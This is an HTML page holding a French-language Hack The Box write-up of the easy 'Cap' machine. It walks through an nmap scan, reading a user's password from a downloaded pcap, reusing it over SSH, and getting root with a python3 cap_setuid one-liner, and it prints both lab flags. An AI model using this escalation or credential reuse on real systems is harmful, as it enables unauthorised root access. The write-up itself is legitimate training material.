@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <style>
+        :root {
+            --accent-color: #FF4D4D;
+        }
+    </style>
+
+    
+    
+    
+    
+    
+    
+
+    
+    <title>[HTB - Easy] Cap</title>
+    <meta name="description" content="Writeup by jsthope">
+    <meta name="keywords" content='jsthope, jsthop3, hope1010, htb, hackthebox, rootme, writeup, walkthrough, hack, hacking, pwn, blog, fr, francais, french, correction, HTB, Easy, Writeup, French'>
+
+    <meta property="og:url" content="https://jsthope.xyz/posts/cap/">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="[HTB - Easy] Cap">
+    <meta property="og:description" content="Writeup by jsthope">
+    <meta property="og:image" content="https://jsthope.xyz/images/cap/cap.png">
+    <meta property="og:image:secure_url" content="https://jsthope.xyz/images/cap/cap.png">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="[HTB - Easy] Cap">
+    <meta name="twitter:description" content="Writeup by jsthope">
+    <meta property="twitter:domain" content="https://jsthope.xyz/posts/cap/">
+    <meta property="twitter:url" content="https://jsthope.xyz/posts/cap/">
+    <meta name="twitter:image" content="https://jsthope.xyz/images/cap/cap.png">
+
+    
+    <link rel="canonical" href="https://jsthope.xyz/posts/cap/" />
+
+    
+    <link rel="stylesheet" type="text/css" href="/css/normalize.min.css" media="print">
+
+    
+    <link rel="stylesheet" type="text/css" href="/css/main.min.css">
+
+    
+    <link id="dark-theme" rel="stylesheet" href="/css/dark.min.css">
+
+    
+    <script src="/js/bundle.min.7c4d836d7c9c27452a883b40f29a57af928d9532635f0e5254738080cc8c5d29.js" integrity="sha256-fE2DbXycJ0UqiDtA8ppXr5KNlTJjXw5SVHOAgMyMXSk="></script>
+
+    
+    
+    <script async src="https://analytics.umami.is/script.js" data-website-id="fe709d70-9350-43d6-be51-e47a32a05779"></script>
+    
+</head>
+<body>
+        <script type="text/javascript">
+            
+            setThemeByUserPref();
+        </script><header class="header">
+    <nav class="header-nav">
+
+        
+        <div class="avatar">
+            <a href="https://jsthope.xyz/">
+                <img src="https://jsthope.xyz/images/avatar.png" alt="avatar" />
+            </a>
+        </div>
+        
+
+        <div class="nav-title">
+            <a class="nav-brand" href="https://jsthope.xyz/">jsthope</a>
+        </div>
+
+        <div class="nav-links">
+            
+            <div class="nav-link">
+                <a href="https://jsthope.xyz/posts/"> Posts </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://jsthope.xyz/tags/"> Tags </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://github.com/JstHope"><span data-feather='github'></span>  </a>
+            </div>
+            
+
+            <span class="nav-icons-divider"></span>
+            <div class="nav-link dark-theme-toggle">
+                <span id="dark-theme-toggle-screen-reader-target" class="sr-only"></span>
+                <a>
+                    <span id="theme-toggle-icon" data-feather="moon"></span>
+                </a>
+            </div>
+
+            <div class="nav-link" id="hamburger-menu-toggle">
+                <span id="hamburger-menu-toggle-screen-reader-target" class="sr-only">menu</span>
+                <a>
+                    <span data-feather="menu"></span>
+                </a>
+            </div>
+
+            
+            <ul class="nav-hamburger-list visibility-hidden">
+                
+                <li class="nav-item">
+                    <a href="https://jsthope.xyz/posts/"> Posts </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://jsthope.xyz/tags/"> Tags </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://github.com/JstHope"><span data-feather='github'></span>  </a>
+                </li>
+                
+                <li class="nav-item dark-theme-toggle">
+                    <span id="dark-theme-toggle-screen-reader-target" class="sr-only">theme</span>
+                    <a>
+                        <span id="theme-toggle-icon" data-feather="moon"></span>
+                    </a>
+                </li>
+            </ul>
+
+        </div>
+    </nav>
+</header>
+<main id="content">
+    <div class="post container">
+    <div class="post-header-section">
+        <h1>[HTB - Easy] Cap</h1>
+        <small role="doc-subtitle">Writeup by jsthope</small>
+        <p class="post-date">
+            September 8, 2023
+        </p>
+
+        <ul class="post-tags">
+        
+            <li class="post-tag"><a href="https://jsthope.xyz/tags/htb">HTB</a></li>
+        
+            <li class="post-tag"><a href="https://jsthope.xyz/tags/easy">Easy</a></li>
+        
+            <li class="post-tag"><a href="https://jsthope.xyz/tags/writeup">Writeup</a></li>
+        
+            <li class="post-tag"><a href="https://jsthope.xyz/tags/french">French</a></li>
+        
+        </ul>
+    </div>
+
+    <div class="post-content">
+        <p>
+            <p><img src="/images/cap/cap.png" alt="HTB Cap Image"></p>
+<h1 id="nmap">nmap</h1>
+<p>On va tout d’abord scanner les ports ouverts de l’ip:</p>
+<pre tabindex="0"><code class="language-┌─[eu-vip-23]─[10.10.14.5]─[htb-jsthope@htb-xbv1dyv8fx]─[~]" data-lang="┌─[eu-vip-23]─[10.10.14.5]─[htb-jsthope@htb-xbv1dyv8fx]─[~]">└──╼ [★]$ nmap 10.10.10.245
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-07 22:35 BST
+Nmap scan report for 10.10.10.245
+Host is up (0.18s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 8.69 seconds
+</code></pre><h1 id="http">http</h1>
+<p>Sur le site, on remarque qu&rsquo;on est connecté de base à l&rsquo;utilisateur &ldquo;Nathan&rdquo;.
+On trouve ensuite que le site permet de télécharger des trames réseaux:
+http://10.10.10.245/data/0</p>
+<p>On download le pcap numero 0 et on l&rsquo;analyse ensuite avec Wireshark:
+<img src="/images/cap/pcap.png" alt="pcap"></p>
+<p>On trouve alors le mot de passe de Nathan (utilisé pour le ftp)</p>
+<h1 id="ssh">ssh</h1>
+<p>Le mot de passe ftp de Nathan et le même que sur son ssh:</p>
+<pre tabindex="0"><code>─[eu-vip-23]─[10.10.14.5]─[htb-jsthope@htb-xbv1dyv8fx]─[~]
+└──╼ [★]$ ssh nathan@10.10.10.245
+</code></pre><p>On récupère alors le flag de l&rsquo;user:</p>
+<pre tabindex="0"><code>nathan@cap:~$ ls
+user.txt
+nathan@cap:~$ cat user.txt
+ebd6713a9539c2c987b214d1a48bc21c
+</code></pre><h1 id="privesc">privesc</h1>
+<p>On cherche si on a des vulnérabilités liées aux capabilities:</p>
+<pre tabindex="0"><code>nathan@cap:~$ getcap -r / 2&gt;/dev/null
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+</code></pre><p>On voit tout de suite ici que python3.8 est sûrement vulnérable à un exploit de type setuid. 
+On peut trouver les exploits de capabilities sur <a href="https://gtfobins.github.io/gtfobins/python/#capabilities">gfobins</a>:</p>
+<pre tabindex="0"><code>nathan@cap:~$ python3 -c &#39;import os; os.setuid(0); os.system(&#34;/bin/sh&#34;)&#39;
+
+# id
+uid=0(root) gid=1001(nathan) groups=1001(nathan)
+</code></pre><p>On est bien root !
+Il ne reste plus qu&rsquo;a récupérer le dernier flag:</p>
+<pre tabindex="0"><code># cat /root/root.txt
+0987dc49d725b0d0f38fe7f6349b266c
+</code></pre>
+        </p>
+        
+    </div>
+
+    <div class="prev-next">
+        
+    </div>
+</div>
+
+<aside class="post-toc">
+    <nav id="toc">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#nmap">nmap</a></li>
+    <li><a href="#http">http</a></li>
+    <li><a href="#ssh">ssh</a></li>
+    <li><a href="#privesc">privesc</a></li>
+  </ul>
+</nav>
+    </nav>
+</aside>
+
+
+
+    
+
+        </main><footer class="footer">
+    
+    
+
+    
+    <span>
+        Made with &#10084;&#65039; using <a target="_blank" href="https://github.com/526avijitgupta/gokarna">Gokarna</a>
+    </span>
+</footer>
+</body>
+</html>
